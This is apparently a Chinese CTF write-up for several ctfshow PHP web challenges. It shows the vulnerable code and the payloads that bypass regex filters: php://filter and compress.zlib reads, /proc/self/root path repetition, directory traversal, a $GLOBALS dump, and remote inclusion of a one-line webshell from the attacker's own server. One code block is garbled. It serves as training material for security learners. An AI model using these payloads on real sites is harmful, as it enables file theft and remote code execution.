error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2); 
```

考点:GLOBALS超全局变量的值。

$GLOBALS — 引用全局作用域中可用的全部变量
一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

```php
<?php
$a=1;
$b=2;
var_dump($GLOBALS);
?>
输出
 'GLOBALS' =>
  &array
  'a' =>
  int(1)
  'b' =>
  int(2)
```

payload

```php
?v1=ctfshow&v2=GLOBALS
```

##  22.php伪协议

###  WEB112 

代码

```php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 

is_file():可以用来判断是否是一个正常的文件
is_file($filename):bool
```

首先代码审计，我们的目的是不能识别出是一个文件,然后通过filter的正则匹配，并且可以读取到文件

看到过滤了，data，input，想到了php伪协议filter

payload

```
?file=php://filter/resource=flag.php,直接读取文件
也可以使用编码来读取文件payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
file=compress.zlib://flag.php
payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php

```

## 23. php伪协议--filter

filter编码绕过死亡die

https://www.freebuf.com/articles/web/266565.html

###  web114

payload

```php
php://filter/resource=flag.php,这个就可以不用使用过滤器了。
```

##  24.linux的/proc/self学习

https://blog.csdn.net/unexpectedthing/article/details/121338877

##  25./proc/self/root绕过

###  web113

```php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

非预期解：file=compress.zlib://flag.php

预期解：

这个题过滤了filter，所以换种方法

我们多次使用/proc/self/root来绕过

参考文章：https://www.anquanke.com/post/id/213235

payload：

```
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

##  26.gettext拓展的使用

###  web128

代码

```php
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}
function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
} 
```

首先我们需要利用var_dump,但是check函数过滤了数字和字母

```
call_func_array()函数
将第一个参数作为回调函数，其余参数都作为函数来传进去
```

当开启了gettext()拓展后，我们使用gettext()

```
<?php
echo gettext("ctfshow");
//输出结果：ctfshow

echo _("ctfshow");
//输出结果：ctfshow
```

因此`call_user_func('_','ctfshow')` 返回的结果为ctfshow，接下来到第二层`call_user_func`,我们使用get_defined_vars函数

```
get_defined_vars ( void ) : array 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。
```

因为还有个call_func_array，需要函数，我们没法使用globals数组

```
$GLOBALS引用全局作用域中可用的全部变量(一定是全局变量)
一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
例子1：
<?php
function test() {
    $foo = "local variable";

    echo '$foo in global scope: ' . $GLOBALS["foo"] . "\n";
    echo '$foo in current scope: ' . $foo . "\n";
}

$foo = "Example content";
test();
?>
$foo in global scope: Example content
$foo in current scope: local variable
如果全局变量的foo没有，函数中$GLOBALS输出不了
```

##  27.stripos()函数

###  web129

代码

```
 <?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
} 
```

```
stripos() 
查找字符串在另一字符串中第一次出现的位置（不区分大小写）。
```

这道题就有多个姿势

目录遍历

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201020193345924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70#pic_center)xxxxxxxxxx2 1./ctfshow/../../../../var/www/html/flag.php  #./表示当前目录，具体多少个../需要自己慢慢尝试2/ctfshow/../var/www/html/flag.php  # /表示表示根目录
```

远程文件包含

在自己的服务器上写一句话木马进行利用，url为你的服务器ip或者域名，xxxx.php为你写的一句话木马

```
CODE
复制成功?f=http://url/xxxx.php?ctfshow
```

php伪协议绕过

```
?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php
|ctfshow,表示多个过滤器，所以就可以绕过
```

##  28.利用bash的内置变量来替换字母

###  web118-122

```php
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

```

